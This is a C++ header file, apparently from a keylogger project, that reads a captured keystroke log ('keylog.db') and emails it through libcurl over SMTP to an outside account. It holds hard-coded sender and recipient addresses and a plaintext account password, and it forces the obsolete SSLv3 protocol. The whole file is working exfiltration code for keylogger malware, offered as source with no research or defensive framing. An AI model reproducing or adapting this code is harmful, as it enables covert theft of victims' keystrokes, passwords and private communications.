#ifndef SMTP_ATTACH_H
#define SMTP_ATTACH_H

#include <stdio.h>
#include <string.h>
#include <iostream>
#include <curl/curl.h>
#include <string>
#include <cmath>
#include <fstream>

#define FROM        "<keylogger_project_2014@yahoo.com>"

#if defined(__linux)
#define TO          "<keyloggerproject2014@gmail.com>"
#elif defined(_WIN32)
#define TO          "<keyloggerproject2014@gmail.com"
#endif

#define AUTH        "keylogger_project_2014@yahoo.com"

#define SUBJECT     "SMTP TLS Test 9.1"
#define FILENAME    "keylog.db"
#define URL         "smtp://smtp.mail.yahoo.com:587"
#define USERNAME    "keylogger_project_2014@yahoo.com"
#define PASSWORD    "hood2014"


std::string get_file_contents(const char *filename);


static const int CHARS= 132;			//Sending 54 chararcters at a time with \r , \n and \0 it becomes 57 and its encoded length will be 76 by the formula string_length/3*4
static const int ADD_SIZE= 7;			// ADD_SIZE for TO,FROM,SUBJECT,CONTENT-TYPE,CONTENT-TRANSFER-ENCODING,CONETNT-DISPOSITION and \r\n
static const int SEND_BUF_SIZE= 96;
static char (*fileBuf)[CHARS] = NULL;






struct fileBuf_upload_status
{
  int lines_read;
};

size_t read_file()
{
    std::string encoded_buf = get_file_contents(FILENAME);

	size_t encoded_buf_len = encoded_buf.size();
	size_t len(0),buffer_size(0);
	int no_of_rows = (int)ceil((double)encoded_buf.size()/SEND_BUF_SIZE) ;
	//int read(0);
	fileBuf = new char[ADD_SIZE + no_of_rows + 1][CHARS];	//Extra row for our special character to be used in conditional statements,here ""
											// ADD_SIZE for TO,FROM,SUBJECT,CONTENT-TYPE,CONTENT-TRANSFER-ENCODING,CONETNT-DISPOSITION and \r\n

	strcpy(fileBuf[len++],"TO: " TO "\r\n");
	buffer_size += strlen(fileBuf[len-1]) + 1;	// 1 for \0
	strcpy(fileBuf[len++],"FROM: " FROM "\r\n");
	buffer_size += strlen(fileBuf[len-1]) + 1;
	strcpy(fileBuf[len++],"SUBJECT: " SUBJECT "\r\n");
	buffer_size += strlen(fileBuf[len-1]) + 1;

    strcpy(fileBuf[len++],"CONTENT-TYPE: text/plain; name=\"" FILENAME "\"\r\n");
    buffer_size += strlen(fileBuf[len-1]) + 1;

    strcpy(fileBuf[len++],"CONTENT-TRANSFER-ENCODING: 7BIT\r\n");
    buffer_size += strlen(fileBuf[len-1]) + 1;

	strcpy(fileBuf[len++],"\r\n");
	buffer_size += strlen(fileBuf[len-1]) + 1;


	int pos = 0;
	std::string sub_encoded_buf;


	for(; (signed) len < no_of_rows + ADD_SIZE; ++len)
	{
		if (pos*SEND_BUF_SIZE <= (signed) encoded_buf_len)
		{
			sub_encoded_buf = encoded_buf.substr(pos*SEND_BUF_SIZE, SEND_BUF_SIZE);
			pos++;
            //sub_encoded_buf += "\r\n";
            memcpy(fileBuf[len],sub_encoded_buf.c_str(),sub_encoded_buf.size());
            buffer_size += sub_encoded_buf.size() ;	// 1 for \0
		}
	}

    strcpy(fileBuf[len],"");

    return -1;
}


static size_t fileBuf_source(void *ptr, size_t size, size_t nmemb, void *userp)
{
	struct fileBuf_upload_status *upload_ctx = (struct fileBuf_upload_status *)userp;
	const char *fdata;

	if((size == 0) || (nmemb == 0) || ((size*nmemb) < 1))
	{
		return 0;
	}

	fdata = fileBuf[upload_ctx->lines_read];

	if(strcmp(fdata,""))
	{
		size_t len = strlen(fdata);
		memcpy(ptr, fdata, len);
		upload_ctx->lines_read++;
		return len;
	}
	return 0;
}

int main_smtp(void)
{
  CURL *curl;
  CURLcode res = CURLE_OK;
  struct curl_slist *recipients = NULL;
  struct fileBuf_upload_status file_upload_ctx;
  size_t file_size(0);

  file_upload_ctx.lines_read = 0;

  curl = curl_easy_init();
  file_size = read_file();
  if(curl)
  {
    curl_easy_setopt(curl, CURLOPT_USERNAME, USERNAME);
    curl_easy_setopt(curl, CURLOPT_PASSWORD, PASSWORD);

    curl_easy_setopt(curl, CURLOPT_URL, URL);
    curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, (long)CURL_SSLVERSION_SSLv3);
    //curl_easy_setopt(curl, CURLOPT_CAINFO, "google.pem");
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);
    recipients = curl_slist_append(recipients, TO);
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
    curl_easy_setopt(curl, CURLOPT_MAIL_AUTH, AUTH);

	curl_easy_setopt(curl, CURLOPT_INFILESIZE, file_size);
	curl_easy_setopt(curl, CURLOPT_READFUNCTION, fileBuf_source);
    curl_easy_setopt(curl, CURLOPT_READDATA, &file_upload_ctx);
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    //curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);

    res = curl_easy_perform(curl);

    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));

    curl_slist_free_all(recipients);

    curl_easy_cleanup(curl);
  }
  delete[] fileBuf;
  return (int)res;
}



std::string get_file_contents(const char *filename)
{
  std::ifstream in  (filename, std::ios::in | std::ios::binary);
  if (in)
  {
    std::string contents;
    in.seekg(0, std::ios::end);
    contents.resize(in.tellg());
    in.seekg(0, std::ios::beg);
    in.read(&contents[0], contents.size());
    in.close();
    return(contents);
  }
  return "";
}

#endif
